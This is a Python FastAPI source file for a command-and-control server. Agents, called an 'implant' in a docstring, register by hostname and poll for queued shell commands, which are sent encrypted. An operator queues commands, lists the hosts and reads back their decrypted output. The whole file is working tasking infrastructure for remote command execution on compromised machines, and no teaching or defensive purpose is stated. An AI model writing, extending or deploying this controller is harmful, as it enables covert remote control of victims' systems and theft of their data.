import datetime
import uuid

from fastapi import FastAPI

from crypto import decrypt, encrypt
from db import init_db

app = FastAPI()
conn = init_db()


def now() -> str:
    return datetime.datetime.utcnow().isoformat()


@app.post("/register")
def register(hostname: str):
    agent_id = str(uuid.uuid4())
    conn.execute(
        "INSERT INTO agents VALUES (?,?,?,?)", (agent_id, hostname, now(), now())
    )
    conn.commit()
    return {"agent_id": agent_id}


@app.get("/tasks/poll")
def poll(agent_id: str):
    conn.execute("UPDATE agents SET last_seen=? WHERE id=?", (now(), agent_id))
    conn.commit()
    row = conn.execute(
        "SELECT id, cmd FROM tasks WHERE agent_id=? AND status='pending' "
        "ORDER BY created_at LIMIT 1",
        (agent_id,),
    ).fetchone()
    if not row:
        return {}
    return {"task_id": row[0], "cmd": encrypt(row[1])}


@app.post("/tasks/result")
def result(task_id: str, stdout: str, stderr: str, exit_code: int):
    stdout_plain = decrypt(stdout)
    stderr_plain = decrypt(stderr)
    conn.execute(
        "UPDATE tasks SET status='done', stdout=?, stderr=?, exit_code=?, "
        "completed_at=? WHERE id=?",
        (stdout_plain, stderr_plain, exit_code, now(), task_id),
    )
    conn.commit()
    return {"ok": True}


@app.post("/tasks/queue")
def queue_task(agent_id: str, cmd: str):
    """Operator pushes a command for an agent. Stored as plaintext; encrypted on the
    way out to the implant by the /tasks/poll endpoint."""
    task_id = str(uuid.uuid4())
    conn.execute(
        "INSERT INTO tasks VALUES (?,?,?,?,?,?,?,?,?)",
        (task_id, agent_id, cmd, "pending", None, None, None, now(), None),
    )
    conn.commit()
    return {"task_id": task_id}


@app.get("/tasks/results")
def get_results(agent_id: str):
    """Return all completed tasks for an agent, newest first."""
    rows = conn.execute(
        "SELECT id, cmd, stdout, stderr, exit_code, completed_at "
        "FROM tasks WHERE agent_id=? AND status='done' ORDER BY completed_at DESC",
        (agent_id,),
    ).fetchall()
    return [
        {
            "task_id": r[0],
            "cmd": r[1],
            "stdout": r[2],
            "stderr": r[3],
            "exit_code": r[4],
            "completed_at": r[5],
        }
        for r in rows
    ]


@app.get("/agents")
def list_agents():
    rows = conn.execute("SELECT id, hostname, last_seen FROM agents").fetchall()
    return [{"id": r[0], "hostname": r[1], "last_seen": r[2]} for r in rows]